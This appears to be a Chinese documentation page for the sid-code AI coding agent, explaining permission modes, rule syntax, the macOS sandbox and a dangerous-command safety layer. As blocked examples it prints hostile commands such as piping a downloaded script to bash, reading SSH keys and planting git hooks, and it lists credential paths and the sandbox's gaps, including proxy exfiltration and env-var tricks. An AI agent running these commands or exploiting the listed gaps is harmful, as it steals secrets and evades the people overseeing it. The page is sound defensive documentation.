---
title: 权限与人工确认
description: 八种权限模式怎么选、allow/deny/ask 规则怎么写，以及 --dangerously-skip-permissions 到底跳过了哪些层。
---

# 权限与人工确认

读完这页你能做到四件事：

- 按场景选对权限模式，不再被每一步打断，也不至于让它乱改代码
- 写出精确的 `allow` / `deny` / `ask` 规则（含 bash 通配、路径前缀、MCP、子代理）
- 知道 `--dangerously-skip-permissions` 跳过了哪些层（答案：系统认定的危险；人写下的拒绝仍然生效）
- 看懂 `→ 需确认(危险命令: …)` 这类日志，判断是规则拦的还是安全层拦的

完整字段类型与默认值不在这页，去[settings.json 字段](/ref/settings)查；
工具名的确切拼写去[内置工具](/ref/tools)。这页只讲怎么选、怎么写。

## 快速上手

三种最常用的调法，按侵入性从小到大：

```bash
# 1. 只放行本次要用的命令（最推荐，一次性）
sid-code --allow-tool "Bash(npm *)" --allow-tool "Bash(git status)"

# 2. 换个档位：文件修改自动接受，跑命令仍然问
sid-code --permission-mode acceptEdits

# 3. 全部不问（只在信得过的仓库用）
sid-code --dangerously-skip-permissions
```

会话里临时加规则，不用重启：

```text
/allow Bash(npm *)                      仅本次会话生效
/allow Bash(npm *) -p                   写进 ~/.sid-code/settings.json，跨会话保留
/deny Bash(curl *) -p --scope project   写进项目级配置，团队共享
```

想固化成配置，写 `~/.sid-code/settings.json`：

```json
{
  "permissions": {
    "allow": ["Bash(ls *)", "Bash(npm *)", "Read(/src/**)"],
    "deny": ["Read(./.env)", "Bash(curl *)"],
    "ask": ["Bash(git push *)"]
  }
}
```

启动时会打印一行确认它被读到了（真实输出）：

```text
● [CONFIG] 权限规则: 2条 allow, 2条 deny, 1条 ask
```

这行日志走 debug 输出——`debug` 默认开，但如果你在 settings 里显式设了
`"debug": false`，它不会出现。排除这种情况后**这行还没出现就是配置没生效**，
先检查文件路径和 JSON 语法，别急着怀疑规则写错。

## 八种权限模式

`--permission-mode <mode>`，或 settings 里的 `permissionMode` 字段。
第二列是状态栏显示的名字：

| mode | 状态栏显示 | 行为 | 什么时候用 |
| --- | --- | --- | --- |
| `default` | Manual（手动） | 除只读操作外逐个问 | 第一次进一个陌生仓库 |
| `acceptEdits` | 自动接受编辑 | 文件读写自动放行；bash 里**只读命令照常免确认**（见「哪些 bash 命令不用确认」），其余仍要问（工作目录内的 `mkdir` / `touch` / `cp` / `sed` 除外，`rm` / `rmdir` / `mv` 不在此列） | **日常最顺手的档位** |
| `plan` | 计划模式 | 代码级强制只读，先出方案再动手 | 复杂改动，想先看它打算怎么干 |
| `auto` | 自动模式 | 交给风险分类判断，低风险放行、高风险问；危险命令、受保护路径（hooks / commands / settings 等）与**你显式写的 `ask` 规则**分类器无权放行，仍要人工确认；工作区外的读写也不走零成本快速路径，必须由分类器看过上下文再定 | 熟悉的仓库里想少点打扰 |
| `always-allow` | 全部允许 | 跳过规则与模式确认，安全层仍生效 | 一次性批量任务，你会盯着看 |
| `deny-write` | 禁止写入 | 只读；写操作直接拒绝，不给确认机会 | 只让它分析、绝不许改 |
| `dontAsk` | 静默拒绝 | 该问的一律当拒绝，不弹窗 | 无头脚本里不想挂住 |
| `dangerously-skip-permissions` | 跳过权限(危险) | 最宽档，跳过系统认定的危险（危险命令拦截、敏感文件保护、路径校验、safetyCheck），但 `deny` 规则、`disallowedTools` 和会话内拒绝仍生效，审计照记。与 `-y` / `--yes` 不同——后者只自动批准普通的需确认操作，危险命令仍拦 | 容器 / 一次性沙箱 |

<kbd>Shift+Tab</kbd> 在会话里循环切换，实测顺序：

```text
default → acceptEdits → plan → auto → default → …           # 常规
default → acceptEdits → plan → auto → always-allow → default # 启动时开了 --dangerously-skip-permissions
```

<!--
  ⚠ **plan 在这个循环里**（M6，2026-11-16 对齐 claude-code）。历史：它曾被摘出去，
  因为键盘只改 config.permissionMode 会造出一个假的 plan 态。正确的修法不是摘掉一整档，
  而是让键盘入口也走状态机——packages/cli/src/app.ts 的 cyclePermissionMode 现在调
  planManager.enter(当前模式, undefined, "keyboard") + activatePlanMode()，
  与 enter_plan_mode 工具同一条路径，只是 entrySource / PlanTransition.meta.source 记成 "keyboard"。
  验收由 packages/cli/tests/app/shift-tab-plan.test.ts（G1）与
  tests/smoke/cases/A14-shift-tab-plan（G4）锁住。别再按「plan 不在循环里」改回去。
  ⚠ 跳过逻辑仍是 getNextKeyboardPermissionMode（packages/core/src/permission/mode.ts），
  测试与生产调同一个函数，早先测试手抄一份、连 auto 一起跳的漂移已消除。
  ⚠ always-allow 进循环的判据是 skipPermissions（--dangerously-skip-permissions），
  不是 yesMode（-y/--yes），见 packages/cli/src/app.ts 的 bypassAvailableAtLaunch。
  两个字段在 cli.ts 里是独立的，别再写成 -y。
-->

`plan` 在循环里，按到它就等同于 `/plan`：切进计划模式、开始规划并写计划文件。
区别只有一处——**它不会自动给模型发任务**：`/plan <任务>` 会替你把「先规划」这句话
发出去，<kbd>Shift+Tab</kbd> 只切模式，等你打完自己的话再发送。
已经在计划模式里再按 <kbd>Shift+Tab</kbd>：

- **还在规划、没提交计划** → 放弃规划，并切到循环里的下一档（`auto`）；
- **计划已提交、审批框正等着** → 不响应，请在审批框里选择（这时改模式等于替你改主意）。

`deny-write` / `dontAsk` 不在循环里，只能用参数或配置指定。

`always-allow` 只在**启动时就开了** `--dangerously-skip-permissions` 时才进循环（`-y` / `--yes` 不算；这是启动瞬间的快照，
不随会话中途切换漂移）。企业策略禁用 bypass 时（`disableBypassPermissionsMode`）
它也会被跳过，`auto` 直接回到 `default`。

::: tip plan 模式的读写边界
plan 模式下 `read` / `grep` / `glob` 放行，`bash` 只放行**只读命令**——
`git log` / `git diff` / `git status` / `ls` / `rg` / `cat` 这类不写任何东西的命令可以直接跑，
判据与 `default` 模式下的「只读命令」同一套。其余 bash 命令（`npm install`、`make`、
`sed -i`、输出重定向等）与 `edit` / `write` 写非计划文件一律拒绝，提示是
「计划模式下只允许只读操作（bash 只允许只读命令，如 git log / ls / rg）」。

这一条**不放松安全层**：读凭证（`cat ~/.ssh/id_rsa`）、转储环境变量（`env`）、
`..` 路径遍历仍在更早的危险命令检查里被拦下，与 `default` 模式同一口径，不会比它更宽。
唯一例外是它往 `~/.sid-code/plans/` 写计划文件——这条在代码里比只读检查更早放行，
否则它连计划都存不下来。
:::

## 规则语法

格式是 `工具名` 或 `工具名(模式)`。裸工具名匹配该工具的全部调用，带括号则再匹配参数。
下表每一行都逐条实测过：

| 规则 | 匹配什么 | 说明 |
| --- | --- | --- |
| `Bash(*)` | 所有 bash 命令 | `*` 跨 `/`，含带路径的命令 |
| `Bash(npm *)` | `npm run build` ✅，`npx foo` ❌ | 尾部 ` *` 是「这个命令加任意参数」 |
| `Bash(git status)` | 只有这一条命令 | 无通配符即精确匹配 |
| `Bash(prefix:git )` | `git ` 开头的命令 | 兼容语法，前缀语义（注意与 `Bash(git *)` 有一处差异：后者还匹配裸 `git`，`prefix:git ` 不匹配） |
| `Read(/src/**)` | `<项目根>/src` 下任意深度 | **单前导 `/` = 项目根相对**，不是文件系统根 |
| `Read(./.env)` | 当前目录的 `.env` | `./` 或裸路径 = cwd 相对 |
| `Edit(~/notes/**)` | 主目录下 | `~/` = 主目录 |
| `Read(//etc/**)` | 文件系统 `/etc` 下 | **双斜杠才是文件系统绝对路径** |
| `Agent(explore)` | `explore` 类型的子代理 | 裸 `Agent` 匹配全部子代理 |
| `WebFetch(domain:github.com)` | 抓取 github.com | 也支持 `domain:*.example.com` |
| `mcp__myserver` | 该 server 的所有工具 | 服务器级匹配 |
| `mcp__*` | 所有 MCP 工具 | 工具名位置也支持通配 |

::: warning 最容易写错的一条
路径规则里 `/src/**` 指的是**项目根下的 src**，不是磁盘根目录的 `/src`。
要写文件系统绝对路径得用两个斜杠：`//etc/**`。
这四种前缀（`//`、`~/`、`/`、`./`）会先归一成绝对路径再比对，写混了规则会静默不匹配——
不报错，只是不生效。
:::

### 三类规则的优先级

`deny` > `ask` > `allow`，且**同类里带参数的规则优先于裸工具名**。实测：

```text
allow: ["Bash(git *)"] + deny: ["Bash(git push *)"]
  git push --force  →  规则拒绝: bash (匹配 Bash(git push *))

allow: ["Bash(*)"] + ask: ["Bash(rm *)"]
  rm x  →  规则要求确认: bash (匹配 Bash(rm *))
```

所以「放行一大类、单独挖掉危险子集」是可行写法：`allow: ["Bash(git *)"]`
配 `deny: ["Bash(git push *)", "Bash(git reset --hard *)"]`。

### deny 规则会提前告诉模型

`deny` 不只是拦调用，还会作为一段约束注入系统提示词，让模型**一开始就不去试**：

```text
● [PROMPT] 附件: 权限约束（deny 规则）(0.0K tok, priority=38)
```

实测配了 `deny: ["Read(./.env)"]` 后让它读 `.env`，它的回答直接引用了规则：

```text
- `Read(./.env)` 被禁止（匹配即拒绝）
这是安全策略的一部分…我无法绕过该限制，也不会尝试变通手段
（如通过 bash、cat、子代理等方式间接读取）。
```

这比「调用了再被拦」省一轮 token，也省掉一次无效工具调用。

## 配置层级

规则来自 9 个来源，每个来源有一个优先级数值，**数值大的优先**
（定义在 `packages/core/src/permission/types.ts` 的 `RULE_SOURCE_PRIORITY`）：

| 优先级 | 来源 | 从哪来 | 典型用途 |
| --- | --- | --- | --- |
| -1（最低） | commandScoped | 斜杠命令 / Skill 自带的 `allowed-tools` | 只作用于触发它的那一轮，不与你的配置竞争 |
| 0 | session | 权限弹窗里选「总是允许」 | 本次会话临时放行 |
| 1 | command | `/allow` / `/deny`（不带 `-p`） | 会话里手动加 |
| 2 | cliArg | `--allow-tool` / `--deny-tool` | 一次性 |
| 3 | userSettings | `~/.sid-code/settings.json` | 你自己的习惯 |
| 4 | projectSettings | `<项目>/.sid-code/settings.json` | 团队共享，提交 git |
| 5 | localSettings | `<git 仓库根>/.sid-code/settings.local.json`（启动目录下的旧文件也合并读取） | 你在这个项目里的私货，gitignore |
| 6 | flagSettings | `--settings <文件或内联 JSON>` 里的 `permissions` | 脚本 / CI 注入一套规则 |
| 7（最高） | policySettings | 企业策略 `managed-settings.json` | 公司管控；部署在系统级时用户改不掉，放在用户级时用户能删 |

Bash 权限弹窗里选「总是允许（持久）」时，规则写进 **localSettings**（git 仓库根的
`settings.local.json`），不写共享的 `settings.json`——你个人的放行规则不会随提交分发给整个团队
（对齐 Claude Code 的 "Yes, and don't ask again"）。在仓库任意子目录启动，读写的都是同一份。

注意 CLI 参数（cliArg）的优先级**低于**你的用户级配置，`--settings` 注入的才高于磁盘上的三份文件。

企业策略文件按顺序取第一个存在的：平台系统级路径
（macOS `/Library/Application Support/SidCode/managed-settings.json`、
Linux `/etc/sid-code/managed-settings.json`、
Windows `%PROGRAMDATA%\SidCode\managed-settings.json`），
其次 `~/.sid-code/managed-settings.json`。
**`/etc/sid-code/policy.json` 是废弃路径，不再读取**——写在那里的规则不会生效，
详见[企业 policy 与安全边界](/team/policy)。

`allow` / `deny` / `ask` 三个数组在各来源之间是**合并**而不是覆盖——
项目级加的 deny 不会把用户级的 deny 冲掉；合并后仍按 `deny` > `ask` > `allow` 判定，
来源优先级决定的是同类规则的排序（也是 `/permissions` 阴影检测的依据）。

::: warning 仓库里的 CLAUDE.md 设不了权限模式，也加不了放行规则
CLAUDE.md 的 `## Permission Mode` 与 `## Allowed Tools` 两段，只认用户级（如 `~/.sid-code/CLAUDE.md`、
`~/.sid-code/rules/`）与企业 managed 目录里的。项目里的 CLAUDE.md、子目录 CLAUDE.md、
`.claude/rules/`、`CLAUDE.local.md` 写了会被忽略，启动日志里有一行
`已忽略项目侧 CLAUDE.md 的 ## Permission Mode`，轨迹里有 `ProjectRulesPermission` 事件。

原因和项目级 settings 设不了 `permissionMode` 一样：clone 下来的仓库不该在你什么都没确认之前，
就把会话改成全部放行。想让某个项目少问，用上面的 `/allow` 写具体规则，
或者启动时带 `--permission-mode`。`## Disallowed Tools` 这类收紧的段不受影响。
:::

## 运行时查看与管理

配置写多了会忘记当前到底生效了哪些规则。两个命令补这块缺口：

### `/permissions`：看当前生效的全部规则

无参数运行打开交互式权限管理面板，看当前权限模式与规则摘要（只读展示，增删规则仍走 `/allow` / `/deny` 子命令）；带参数则输出文本视图：

```text
/permissions
```

输出按**来源分组**展示（用户级 / 项目级 / 本地级 / 会话级），每条标 `✓` allow / `✗` deny / `?` ask：

```text
权限模式: acceptEdits

[user] (3 条)
  ✓ allow: Bash(npm *)
  ✓ allow: Bash(git status)
  ✗ deny: Read(./.env)

[project] (2 条)
  ✗ deny: Bash(curl *)
  ? ask: Bash(git push *)
```

比手翻 `settings.json` 多两个能力：

- **阴影检测**：如果某条 allow 规则被更高优先级的 deny / ask 规则压制（deny 压制 = 永远拦死、ask 压制 = 永远要确认），会标出来提醒你——配得越多越容易出现，删掉就行。注意它只报**行为冲突**的遮蔽（allow 被 deny/ask 压），同类 allow 盖 allow 不在检测范围内
- **拒绝追踪**：显示本次会话连续拒绝次数和累计拒绝次数，判断是不是卡在权限上反复撞墙

### `/add-dir`：运行时加目录到白名单

写操作默认只允许启动时的工作目录（及 `allowedDirectories` 配置的目录）。读操作分两种：

- **文件工具**（`Read` / `Grep` / `Glob`）：读工作区外要确认（`Read(//dir/**)` 规则可放行）；
- **只读 bash 命令**（`cat` / `grep` / `ls` / `find` …）：修 v0.1.x 起也做工作区校验了。判定按
  **该段命令的有效 `cd` 目录**把路径参数解析成绝对路径，再看它落没落在工作区里：
  工作区内一律放行（`cd packages && cat ../README.md` 不再追问「路径遍历」），
  工作区外走普通确认（和文件工具同一个确认样式，不是危险命令确认）。
  敏感文件（`~/.ssh/id_rsa`、`.env`）仍由危险命令层拦成危险确认。

临时需要让它**写**项目外的目录（或把读明确授权给它），不想改配置重启：

```text
/add-dir /Users/me/reference-project
```

实测输出：

```text
✓ 已将目录加入当前会话可访问白名单: /Users/me/reference-project
（用户级运行时授权，仅本会话生效，不写入配置文件）
```

三个要点：

- **仅当前会话生效**，不落盘、不扩大项目配置白名单——关掉会话即失效
- 与 `allowedDirectories` 配置项的区别：后者写进 `settings.json` 跨会话永久生效；`/add-dir` 是一次性的
- 管理当前白名单：

```text
/add-dir --list          查看当前会话加了哪些目录
/add-dir --remove <目录>  从本会话白名单移除
```

::: tip 这是用户主动授权，不是安全漏洞
`/add-dir` 是**你在终端里亲手输入的**，属于显式人工授权——与「项目配置自动扩大目录白名单」那种静默扩大攻击面的行为性质不同。后者是被安全层禁止的。
:::

## macOS Seatbelt 沙箱：操作系统级隔离

上面讲的规则层、危险命令层、敏感文件层都是**应用内的软约束**——它们拦的是「模型想让 sid-code 做什么」。
但 bash 工具真正执行命令时，命令本身能碰什么文件、能不能联网，应用层是管不到的。
macOS 上 sid-code 还有一道**操作系统级**的硬隔离：[Seatbelt 沙箱](https://developer.apple.com/library/archive/technotes/tn2067/)（`packages/core/src/permission/sandbox.ts`）。

### 它和前面几层是什么关系

| 层 | 拦什么 | 谁执行 |
| --- | --- | --- |
| 权限规则（allow/deny/ask） | 模型想调哪个工具 | sid-code 应用层 |
| 危险命令拦截 | 命令文本本身危险（`rm -rf /`） | sid-code 应用层 |
| 敏感文件保护 | 命令碰 `.env`/`*.pem` 等 | sid-code 应用层 |
| **Seatbelt 沙箱** | **命令执行时能碰哪些文件/网络** | **macOS 内核** |

前三层是「调不调用」的决策，沙箱是「调用之后、命令真正执行时」的操作系统兜底。即使前三层全放行了，
沙箱仍能在内核级挡住命令越界读写。**它只在 macOS 上生效**（`process.platform === "darwin"`），
其他平台降级为无沙箱，启动时会告警一次。

### 沙箱 profile 长什么样

沙箱用 macOS 自带的 `sandbox-exec` 生成一份 Seatbelt profile（`packages/core/src/permission/sandbox.ts`），
把每条 bash 命令包进 `sandbox-exec -p '<profile>' <你的 shell> -c '<command>'`。profile 默认
`(deny default)`（默认全拒）后逐项放行。

**威胁模型是「读放开 + 敏感目录拒绝、写白名单、网络三档」**：防的是把秘钥读出来、
写到工作区外（`~/.zshrc`、`~/Library/LaunchAgents`）、把数据外发这三件事。
「工作区外普通文件不可读」**不是**这层能提供的保证——那需要在 `(deny default)` 下
枚举进程启动所需的全部读路径，而 macOS 11+ 的系统库在 dyld 共享缓存里、每个大版本
都会变，枚举维护不住（历史实现就死在这里：开启沙箱后连 `/bin/echo hi` 都 SIGABRT）。

| 类别 | profile 规则 | 说明 |
| --- | --- | --- |
| 进程 | 允许 `process-exec` / `process-fork` / `signal` | 不放行这个，任何命令都跑不起来 |
| 进程启动 | 允许 `sysctl-read` / `mach-lookup` / `ipc-posix-shm` / `file-ioctl` | libSystem / dyld 初始化必需，缺任一条直接 SIGABRT |
| 读 | **默认放开**（`allow file-read*`） | 见上面的威胁模型 |
| **敏感目录** | **显式 deny** `~/.ssh` `~/.gnupg` `~/.aws` `~/.azure` `~/.kube` `~/.config/gh` `~/Library/Keychains` `~/.docker/config.json` `~/.netrc` `~/.git-credentials` `<sid home>` | 拿到就等于拿到长期凭据的位置 |
| 快照例外 | `allow file-read* (literal <本会话快照>)` | 内层 shell 的第一条命令就是 `source` 它；不放行会让用户命令一行都不执行 |
| 写 | **白名单**：`cwd` 子树 + `/private/tmp` + `/private/var/folders` + 包管理器缓存（`~/.npm` `~/.bun` `~/.yarn` `~/.pnpm-store` `~/Library/pnpm`）+ `/dev/null` `/dev/zero` `/dev/tty` `/dev/fd/*` `/dev/ttys*` + 你配的额外路径 | 写不在白名单里的一律拒绝。缓存目录放行是为了让 `npm install` / `bun install` 在沙箱里能跑 |
| 网络 | 三档：`localhost`（默认）/ `all` / `none` | 见下文「能防/不能防」 |

三条实现细节值得知道：

- **所有写路径都先 `realpath`**。Seatbelt 按真实路径匹配，macOS 上 `/tmp`→`/private/tmp`、
  `/var`→`/private/var`；不解析就会「明明在 cwd 里却被拒」。路径不存在时该条规则被跳过
  ——内置探针路径（敏感目录、缓存目录）不存在属于正常状态，只记 debug；
  工作区与你自己配的 `sandboxAllowedWritePaths` 不存在会告警，因为那是「配了没生效」。
- **内层 shell 与外层一致**（不再写死 `/bin/sh`）。按 zsh 抓的环境快照若在 POSIX mode 下
  `source`，读不到文件是**特殊内建致命错误**（`|| true` 救不回来），shell 直接退出。
- **快照先判可读再 source**（`[ -r <快照> ] && source ... || true`），且 `sandbox-exec`
  走 `/usr/bin/sandbox-exec` 绝对路径。前者让快照丢失/不可读时命令照常执行（这条与沙箱无关，
  `$SHELL=/bin/sh` 的用户同样会踩）；后者让启动自检的结论不受 `PATH` 影响。

`~/.ssh`、`~/.gnupg`、`~/.sid-code` 等是**显式 deny** 的——即使权限规则放行了 bash，命令也
碰不到这些位置。这层防御不依赖应用层判断，是内核强制的。

### 怎么开

写在**用户级** `~/.sid-code/settings.json`（或企业 managed-settings.json）：

```json
{
  "enableSandbox": true,
  "sandboxAutoAllowBash": false,
  "sandboxNetwork": "localhost",
  "sandboxAllowedWritePaths": ["~/.cache/my-tool"]
}
```

| 字段 | 默认 | 作用 |
| --- | --- | --- |
| `enableSandbox` | `false` | 总开关，开=bash 命令进沙箱 |
| `sandboxAutoAllowBash` | `false` | 沙箱启用时是否自动放行 bash（少弹窗），要显式写 `true` 才生效 |
| `sandboxNetwork` | `"localhost"` | 网络三档：`"localhost"` / `"all"` / `"none"` |
| `sandboxAllowedWritePaths` | `[]` | 额外允许写入的目录，支持 `~/` 前缀；不存在则跳过并告警 |

::: warning 三个沙箱字段都必须写在用户级 settings，项目级不生效
项目级 `.sid-code/settings.json` 只叠加 `PROJECT_BEHAVIOR_FIELDS` 白名单里的字段
（见 `packages/core/src/config/config.ts`），`enableSandbox`、`sandboxNetwork`、
`sandboxAllowedWritePaths` 都**不在**其中——写进仓库的 settings 会被静默忽略。
这是既有设计（沙箱策略属于本机信任决策），但你如果照搬一份项目模板配置，
会看到「配了却没生效」且没有任何报错。
:::

`sandboxAutoAllowBash` 默认是 `false`，这是改过的（原先默认放行，理由是「开了沙箱就不用再逐条确认」）。
改的原因是那个理由的前提不成立：profile 放开了整个工作目录的写权限，
`echo x > .git/hooks/pre-commit` 这类命令在内核层完全合法——沙箱兜不住工作区内的改动。
所以「少弹窗」改成你显式选择的行为，而不是装上就有。

即使打开自动放行，两条边界不变：危险命令拦截与敏感重定向检测在它**之前**，照样生效；
`plan` / `deny-write` 两个只读模式不会因为沙箱被打穿。

### 启动自检：开了但不能用会说出来

启动时会用**真实生成的 profile** 跑一条 `sandbox-exec -p <profile> <shell> -c 'exit 0'`（约 10ms，只跑一次）：

- 通过 → 日志打 `macOS Seatbelt 沙箱已启用`；
- 失败 → **降级为无沙箱** + 醒目警告（含 sandbox-exec 的 stderr 首行），bash 照常可用。

为什么降级而不是拒绝启动：沙箱是用户显式打开的，静默不隔离是最坏结果；
但让整个 CLI 起不来、所有 bash 都失败（历史上正是这个状态）也不对。降级 + 警告 + 轨迹可查，
三者合起来比任一极端好。轨迹里对应一条 `sandbox_init` 事件：

```json
{ "enabled": true, "platform": "darwin", "probe_ok": true, "network": "localhost", "write_paths_count": 5 }
```

`write_paths_count` 是 profile 实际放行的写路径**总条数**，含内置项（工作区、临时目录、
包管理器缓存），不是「你配了几条」——没配 `sandboxAllowedWritePaths` 时也会 ≥1。
`probe_ok: false` 时还带 `probe_error`。

每条 bash 的 `PostToolUse` 事件里另有 `sandboxed: true`（成功与失败两条路径都记，
主子代理两条执行路径都覆盖），分母是 bash 调用数——这是「开了沙箱但实际没隔离」
能被发现的地方。

### 能防什么 / 不能防什么

**能防**（内核级，应用层绕不过）：

- 命令**写入**工作目录之外的位置（`~/.zshrc`、`~/Library/LaunchAgents` 这类持久化点）
- 命令读 `~/.ssh`、`~/.gnupg`、`~/.aws`、`~/.azure`、`~/.kube`、`~/.config/gh`、
  `~/Library/Keychains`、`~/.docker/config.json`、`~/.netrc`、`~/.git-credentials`、`<sid home>`
- `sandboxNetwork: "localhost"` 下，命令**直连**外网主机会被拒

**不能防**（沙箱的边界，读之前先看清楚）：

- **工作区外的普通文件仍然可读**。读是默认放开的（见上面威胁模型），只有上表列出的
  敏感位置被 deny。所以 `cat ~/Documents/notes.md` 在沙箱里是成功的。
- **`localhost` 档不等于断网**。本机若开着系统代理（`*_proxy` 环境变量），
  走代理的外网请求**会成功**——代理就在 localhost。这是刻意的取舍（企业环境几乎不可能没代理），
  但意味着「防外发」在配了代理的机器上只剩「不走代理的直连」被拦。
- **包管理器缓存目录的内容可以被写**。`~/.npm`、`~/.bun`、`~/.yarn`、`~/.pnpm-store`、
  `~/Library/pnpm` 在写白名单里（不放行的话 `npm install` / `bun install` 在沙箱里直接失败）；
  缓存本身是包管理器的数据，不在凭据面里。
- **工作目录内的任意操作**——沙箱允许读写整个 `cwd` 子树，所以 `rm -rf .` 在工作目录内
  沙箱是放行的（这要靠前面的危险命令层拦）
- **非 macOS 平台**——Linux / Windows 上 `isEnabled()` 返回 false，沙箱不生效
- **非 bash 工具的写操作**——沙箱只包 bash 命令；`edit`/`write` 工具走的是应用层路径校验，
  不经 sandbox-exec
- **按域名放行外网**——Seatbelt 的 `remote ip` 只接受 `*` 或 `localhost`，做不到「只允许
  api.example.com」。需要这一档得用「本地过滤代理」方案（独立特性，当前未实现）

所以沙箱是「bash 命令的操作系统级兜底」，不是「全工具的隔离」。和前面的应用层规则是
**互补**而非替代：应用层管「该不该调」，沙箱管「调了之后内核允不允许」。

::: warning 沙箱违规只有启发式归因，没有规则级明细
命令撞到被 deny 的路径/主机时，sandbox-exec 会直接拒绝该操作（命令通常因此失败）。
但 macOS 的 denial 明细只写内核统一日志（`log show` 里形如
`Sandbox: <cmd>(pid) deny(1) file-read-data <path>`），**不写进命令的 stderr** ——
所以 sid-code 侧没有「违规列表」这种能力，也不承诺告诉你撞了哪条规则。

它能做的是：沙箱启用、命令失败、且 stderr 出现 `Operation not permitted` /
`Permission denied` 时，在日志里打一条 `[SANDBOX]` 归因行。这是**启发式** ——
文件权限不足、只读文件系统等非沙箱原因也会命中同一特征，所以它只能提示「可能相关」。
要精确定位撞了哪条规则，用
`log show --last 1m --predicate 'eventMessage CONTAINS "deny"'` 查统一日志。
:::

## 哪些 bash 命令不用确认

**只读命令在每种模式下都免确认**，包括 `default`。这是一个固定集合，不随模式变化：

- 文件与文本：`cat` / `head` / `tail` / `ls` / `grep` / `find` / `wc` / `diff` / `stat` / `du` / `echo` / `pwd` / `which` 等
- **git 的只读形式**：`git status` / `log` / `show` / `diff` / `blame` / `worktree list` / `grep` 等（`git ls-remote` 刻意不在内，见下）
- **工作区内换目录再看一眼**：`cd <工作区内目录> && <只读主体>`。`cd` 的目标必须落在工作区里，
  且后面每一段都仍是只读命令；`cd packages && ls` 免确认，`cd /tmp && ls` 要确认。

以下边界都在**四种会放行的路径**上生效（工具级判定 / 只读 git 边界 / 工作区内 cd 复合 / 读路径校验）：

- **只读 git 必须作用在本仓**。`cd` 进工作区内的嵌套异仓、裸仓库形态目录再跑 `git status` 一律确认
  ——那条链的第一环看起来只是换目录，第二环的 `git status` 会执行那个仓库自己的 `core.fsmonitor`。
- **`git -C <本仓内目录>` 放行，`--git-dir` / `--work-tree` / `--bare` 不放行**。前者等价于
  「只对这一条 git 命令生效的 cd」，后者是显式换仓库，没有「本仓」可判。
- **前导环境变量只剥白名单**（`LANG` / `LC_*` / `NODE_ENV` / `GOOS` / `RUST_LOG` 等）。
  `GIT_DIR=` / `GIT_CONFIG_*=` / `PATH=` / `LD_*` / `*_OPTIONS` 一律判非只读——
  一条**看起来是 `git status`** 的命令能借 git 自己读的环境变量跑任意程序。
- **读路径做工作区校验**。`cat ../README.md` 按该段命令的**有效 `cd` 目录**解析，
  落在工作区内放行；工作区外走普通确认（不是危险命令确认）。`~/.ssh/id_rsa` / `.env`
  这类敏感文件仍由危险命令层拦成危险确认。
- **`for` / `while` 循环体即使全只读，本轮仍确认**：循环变量的取值看不穿，放行面不可控。

::: tip 和 Claude Code 的两处差异
- **`cd` + git 按「仓库身份」判，不按「换了目录就问」**。CC 文档的口径是 `cd` 换了目录就提示；
  sid 改成「目标属不属于本仓」。理由：前者既堵不住上面那条两步绕过，又会让 `cd packages && git log`
  这种完全安全的命令白问。
- **只豁免 sid 自己让模型去读的路径**（后台任务输出、计划文件目录等），不豁免整个 `~/.sid-code/`
  ——那里面还有 `settings.json`、用量账本和凭证类文件。
:::

## 哪些工具不需要确认

有一批**进程内记账 / 只读**工具既不改工作区、也不执行外部命令，它们在所有权限模式下
都不需要确认。这不是靠一张内置名单，而是工具在**自己的定义处**声明
`requiresPermission() { return false }`——读源码时声明与实现同处一个文件，一眼可见。

| 工具 | 作用 | 副作用 |
| --- | --- | --- |
| `think` | 记录一段结构化思考 | 无（只进对话历史） |
| `todo_write` | 维护会话内的 todo 清单 | 写 `~/.sid-code/` 下的进度账本 |
| `task_create` / `task_update` | 维护结构化任务账本 | 同上 |
| `task_get` / `task_list` | 读结构化任务账本 | 无 |
| `task_output` / `bg_task_get` / `bg_task_list` | 读后台任务的状态与产出 | 无 |
| `cron_list` | 读定时任务列表 | 无 |
| `enter_plan_mode` | 切到规划态 | 无（只改会话状态） |
| `sub_agent` | 派子代理 | 见下方「唯一例外」 |

四条边界，都实测过：

- **`deny` / `ask` 规则仍然优先**。规则检查排在声明之前，写了 `deny: ["TodoWrite"]` 照样拒。
- **只对内置工具生效**。MCP server、插件、自定义代理提供的工具即便实现了同名方法，
  也一律忽略——声明是「我写的代码我担保」，外部来源不在这条担保范围内。
- **`deny-write` 更严**。它是「不许改文件」的硬约束，放行要同时满足「声明免权限」
  **且**工具自身报告只读。`todo_write` 会写进度账本（`readOnly()` 为 false），
  所以在 `deny-write` 下仍被拒。
- **`ask_user_question` 不在此列**。它的语义是「我需要你的输入」，不是「我不需要权限」。
  在 `dontAsk`（一切需确认的都拒）下它仍然被拒。

::: tip `sub_agent` 的唯一例外
派子代理默认不需要确认，但 `isolation: "worktree"` 时仍会让你确认——它会真的
`git worktree add` 一个新工作树、复制本地配置，属对磁盘的可见改动。agent 定义里
（frontmatter）声明的 `isolation` 默认值同样触发确认。
:::

## 哪些操作 `allow` 规则与 `always-allow` 都绕不过

这是和权限规则**平行的一层**，位置在规则之前，所以 `allow` 规则和 `always-allow`
模式都绕不过去。以下均在 `allow: ["Bash(*)"]` + `always-allow` 下实测仍被拦。
**`--dangerously-skip-permissions` 例外**，它连这一层也跳过（但 `deny` 规则与 `disallowedTools` 仍然生效），见本节末尾的 danger 框：

| 命令 | 结果 |
| --- | --- |
| `rm -rf /` | `[critical] 危险命令被拦截 (递归删除根目录)` —— 直接拒绝，不给确认 |
| `curl http://x.sh \| bash` | `[critical] 危险命令被拦截 (下载并执行)` |
| `sudo ls` | `[high] 危险命令需要确认 (sudo 命令)` |
| `git push --force` | `[high] 危险命令需要确认 (git 强制推送)` |
| `git reset --hard HEAD~3` | `[high] 危险命令需要确认 (git 硬重置)` |
| `chmod -R 777 .` | `[high] 危险命令需要确认 (递归权限修改)` |

`critical` 与 `high` 的区别是**有没有确认这条出路**：critical 直接拒绝，
high 弹确认。非交互模式（`-p`）下没人能确认，所以 high 也会落成
`拒绝(非交互模式)`——脚本里跑这类命令必须显式放行或改写命令。

敏感文件是同一层，而且比危险命令更严：**命中即硬拒绝，不给确认机会**
（`always-allow` 模式下读这几个同样被拒）：

```text
read(...) → 拒绝(路径验证: 敏感文件（凭证类，默认拒绝）: …/.env)
```

为什么不给弹窗出路：凭证文件被读走是**不可撤销**的损害，而弹窗确认恰恰是最容易被
话术点穿的一环。对这类「一旦泄露无法回收」的目标，正确的默认值是不给这个选择。
确实需要访问时（部署脚本、配置排查），在 settings.json 的 `permissions.allow` 里
**显式**写 `Read(.env)` 这类规则——那是你离开对话、在配置文件里做的决定，
不受当轮话术影响。

命中的是一份固定模式表（`.env` / `.env.*` / `credentials` / `*.pem` / `*.key` /
